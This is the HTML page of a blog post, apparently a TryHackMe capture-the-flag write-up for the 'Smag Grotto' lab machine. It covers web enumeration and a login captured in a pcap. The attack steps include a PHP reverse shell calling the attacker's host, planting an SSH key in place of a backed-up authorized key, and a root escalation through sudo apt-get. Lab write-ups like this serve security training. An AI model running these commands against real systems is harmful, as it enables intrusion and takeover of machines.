@@ -1,0 +1,152 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Smag Grotto | CyFun</title><meta name=keywords content="ctf,tryhackme,penetration-testing,writeup,linux"><meta name=description content="Smag Grotto TryHackMe writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/tryhackme/smag-grotto/><link crossorigin=anonymous href=/assets/css/stylesheet.8c2cb9234a4e634b8528951f7a47ea89181178c7d2c333ce2c08dfee541ed427.css integrity="sha256-jCy5I0pOY0uFKJUfekfqiRgReMfSwzPOLAjf7lQe1Cc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/tryhackme/smag-grotto/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Smag Grotto"><meta property="og:description" content="Smag Grotto TryHackMe writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/tryhackme/smag-grotto/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-01-01T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-01T00:10:22+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/0day/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/active-directory-basics/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/advent-of-cyber-2/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/adventure-time/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/tryhackme/agent-sudo/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Smag Grotto"><meta name=twitter:description content="Smag Grotto TryHackMe writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"TryHackMe Writeups","item":"https://s4ch.github.io/writeups/tryhackme/"},{"@type":"ListItem","position":3,"name":"Smag Grotto","item":"https://s4ch.github.io/writeups/tryhackme/smag-grotto/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Smag Grotto","name":"Smag Grotto","description":"Smag Grotto TryHackMe writeup","keywords":["ctf","tryhackme","penetration-testing","writeup","linux"],"articleBody":"Do you remember how to analyse packets?\nSmag Grotto\n💢 We will cover the topics Network Enueration Web Enumeration Network Forensics Stored Passwords \u0026 Keys Misconfigured Binaries Task 1 Smag Grotto Deploy the machine and get root privileges.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kali@kali:~/CTFs/tryhackme/Smag Grotto$ gobuster dir -u 10.10.8.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.8.31 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/10/14 12:21:37 Starting gobuster =============================================================== /mail (Status: 301) Progress: 5966 / 220561 (2.70%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2020/10/14 12:22:05 Finished =============================================================== http://10.10.8.31/mail/\nhttp://10.10.8.31/aW1wb3J0YW50/dHJhY2Uy.pcap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Frame 4: 268 bytes on wire (2144 bits), 268 bytes captured (2144 bits) Ethernet II, Src: PcsCompu_57:81:43 (08:00:27:57:81:43), Dst: PcsCompu_dd:5e:de (08:00:27:dd:5e:de) Internet Protocol Version 4, Src: 192.168.33.10, Dst: 192.168.33.69 Transmission Control Protocol, Src Port: 34030, Dst Port: 80, Seq: 1, Ack: 1, Len: 202 Hypertext Transfer Protocol POST /login.php HTTP/1.1\\r\\n Host: development.smag.thm\\r\\n User-Agent: curl/7.47.0\\r\\n Accept: */*\\r\\n Content-Length: 39\\r\\n Content-Type: application/x-www-form-urlencoded\\r\\n \\r\\n [Full request URI: http://development.smag.thm/login.php] [HTTP request 1/1] [Response in frame: 6] File Data: 39 bytes HTML Form URL Encoded: application/x-www-form-urlencoded Form item: \"username\" = \"helpdesk\" Form item: \"password\" = \"cH4nG3M3_n0w\" development.smag.thm\nhelpdesk:cH4nG3M3_n0w\nhttp://development.smag.thm/\nhttp://development.smag.thm/admin.php\n1 php -r '$sock=fsockopen(\"10.8.106.222\",9001);exec(\"/bin/bash -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' 1 echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali\" \u003e /opt/.backups/jake_id_rsa.pub.backup 1 2 3 4 5 6 7 8 9 10 11 12 kali@kali:~/CTFs/tryhackme/Smag Grotto$ ssh jake@10.10.8.31 Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Fri Jun 5 10:15:15 2020 jake@smag:~$ ls user.txt jake@smag:~$ cat user.txt iusGorV7EbmxM5AuIe2w499msaSuqU3j 1 2 3 4 5 6 7 jake@smag:~$ sudo -l Matching Defaults entries for jake on smag: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jake may run the following commands on smag: (ALL : ALL) NOPASSWD: /usr/bin/apt-get https://gtfobins.github.io/gtfobins/apt-get/#sudo\n1 2 3 4 5 6 jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash root@smag:/tmp# cd /root root@smag:/root# ls root.txt root@smag:/root# cat root.txt uJr6zRgetaniyHVRqqL58uRasybBKz2T What is the user flag? iusGorV7EbmxM5AuIe2w499msaSuqU3j\nWhat is the root flag? uJr6zRgetaniyHVRqqL58uRasybBKz2T\n","wordCount":"370","inLanguage":"en","datePublished":"2021-01-01T00:00:00Z","dateModified":"2026-03-01T00:10:22+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/tryhackme/smag-grotto/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/docs/ title=Docs><span>Docs</span></a></li><li><a href=https://s4ch.github.io/ctf/ title=CTF><span>CTF</span></a></li><li><a href=https://s4ch.github.io/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Smag Grotto</h1><div class=post-description>Smag Grotto TryHackMe writeup</div><div class=post-meta><span title='2021-01-01 00:00:00 +0000 UTC'>January 1, 2021</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;370 words&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
+,
+<a href=https://s4ch.github.io/tags/tryhackme/ class=post-tag title=tryhackme>tryhackme</a>
+,
+<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
+,
+<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
+,
+<a href=https://s4ch.github.io/tags/linux/ class=post-tag title=linux>linux</a>
+&nbsp;·&nbsp;
+<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#-we-will-cover--the-topics>💢 We will cover the topics</a></li><li><a href=#task-1-smag-grotto>Task 1 Smag Grotto</a></li></ul></nav></div></details></div><div class=post-content><p>Do you remember how to analyse packets?</p><p><a href=https://tryhackme.com/room/smaggrotto>Smag Grotto</a></p><h2 id=-we-will-cover--the-topics>💢 We will cover the topics<a hidden class=anchor aria-hidden=true href=#-we-will-cover--the-topics>#</a></h2><ul><li>Network Enueration</li><li>Web Enumeration</li><li>Network Forensics</li><li>Stored Passwords & Keys</li><li>Misconfigured Binaries</li></ul><hr><h2 id=task-1-smag-grotto>Task 1 Smag Grotto<a hidden class=anchor aria-hidden=true href=#task-1-smag-grotto>#</a></h2><p>Deploy the machine and get root privileges.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Smag Grotto$ gobuster dir -u 10.10.8.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Gobuster v3.0.1
+</span></span><span class=line><span class=cl>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>[+] Url:            http://10.10.8.31
+</span></span><span class=line><span class=cl>[+] Threads:        10
+</span></span><span class=line><span class=cl>[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl>[+] Status codes:   200,204,301,302,307,401,403
+</span></span><span class=line><span class=cl>[+] User Agent:     gobuster/3.0.1
+</span></span><span class=line><span class=cl>[+] Timeout:        10s
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/14 12:21:37 Starting gobuster
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>/mail (Status: 301)
+</span></span><span class=line><span class=cl>Progress: 5966 / 220561 (2.70%)^C
+</span></span><span class=line><span class=cl>[!] Keyboard interrupt detected, terminating.
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/14 12:22:05 Finished
+</span></span><span class=line><span class=cl>===============================================================
+</span></span></code></pre></td></tr></table></div></div><p><a href=http://10.10.8.31/mail/>http://10.10.8.31/mail/</a></p><p><a href=http://10.10.8.31/aW1wb3J0YW50/dHJhY2Uy.pcap>http://10.10.8.31/aW1wb3J0YW50/dHJhY2Uy.pcap</a></p><p><img loading=lazy src=/writeups/tryhackme/smag-grotto/2020-10-14_12-25.png alt></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Frame 4: 268 bytes on wire (2144 bits), 268 bytes captured (2144 bits)
+</span></span><span class=line><span class=cl>Ethernet II, Src: PcsCompu_57:81:43 (08:00:27:57:81:43), Dst: PcsCompu_dd:5e:de (08:00:27:dd:5e:de)
+</span></span><span class=line><span class=cl>Internet Protocol Version 4, Src: 192.168.33.10, Dst: 192.168.33.69
+</span></span><span class=line><span class=cl>Transmission Control Protocol, Src Port: 34030, Dst Port: 80, Seq: 1, Ack: 1, Len: 202
+</span></span><span class=line><span class=cl>Hypertext Transfer Protocol
+</span></span><span class=line><span class=cl>    POST /login.php HTTP/1.1\r\n
+</span></span><span class=line><span class=cl>    Host: development.smag.thm\r\n
+</span></span><span class=line><span class=cl>    User-Agent: curl/7.47.0\r\n
+</span></span><span class=line><span class=cl>    Accept: */*\r\n
+</span></span><span class=line><span class=cl>    Content-Length: 39\r\n
+</span></span><span class=line><span class=cl>    Content-Type: application/x-www-form-urlencoded\r\n
+</span></span><span class=line><span class=cl>    \r\n
+</span></span><span class=line><span class=cl>    [Full request URI: http://development.smag.thm/login.php]
+</span></span><span class=line><span class=cl>    [HTTP request 1/1]
+</span></span><span class=line><span class=cl>    [Response in frame: 6]
+</span></span><span class=line><span class=cl>    File Data: 39 bytes
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>HTML Form URL Encoded: application/x-www-form-urlencoded
+</span></span><span class=line><span class=cl>    Form item: &#34;username&#34; = &#34;helpdesk&#34;
+</span></span><span class=line><span class=cl>    Form item: &#34;password&#34; = &#34;cH4nG3M3_n0w&#34;
+</span></span></code></pre></td></tr></table></div></div><p><code>development.smag.thm</code></p><p><code>helpdesk:cH4nG3M3_n0w</code></p><p><a href=http://development.smag.thm/>http://development.smag.thm/</a></p><p><a href=http://development.smag.thm/admin.php>http://development.smag.thm/admin.php</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>php</span> <span class=o>-</span><span class=nx>r</span> <span class=s1>&#39;$sock=fsockopen(&#34;10.8.106.222&#34;,9001);exec(&#34;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali&#34; &gt; /opt/.backups/jake_id_rsa.pub.backup
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Smag Grotto$ ssh jake@10.10.8.31
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Last login: Fri Jun  5 10:15:15 2020
+</span></span><span class=line><span class=cl>jake@smag:~$ ls
+</span></span><span class=line><span class=cl>user.txt
+</span></span><span class=line><span class=cl>jake@smag:~$ cat user.txt
+</span></span><span class=line><span class=cl>iusGorV7EbmxM5AuIe2w499msaSuqU3j
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>jake@smag:~$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries for jake on smag:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User jake may run the following commands on smag:
+</span></span><span class=line><span class=cl>    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+</span></span></code></pre></td></tr></table></div></div><p><a href=https://gtfobins.github.io/gtfobins/apt-get/#sudo>https://gtfobins.github.io/gtfobins/apt-get/#sudo</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash
+</span></span><span class=line><span class=cl>root@smag:/tmp# cd /root
+</span></span><span class=line><span class=cl>root@smag:/root# ls
+</span></span><span class=line><span class=cl>root.txt
+</span></span><span class=line><span class=cl>root@smag:/root# cat root.txt
+</span></span><span class=line><span class=cl>uJr6zRgetaniyHVRqqL58uRasybBKz2T
+</span></span></code></pre></td></tr></table></div></div><ol><li>What is the user flag?</li></ol><p><code>iusGorV7EbmxM5AuIe2w499msaSuqU3j</code></p><ol start=2><li>What is the root flag?</li></ol><p><code>uJr6zRgetaniyHVRqqL58uRasybBKz2T</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
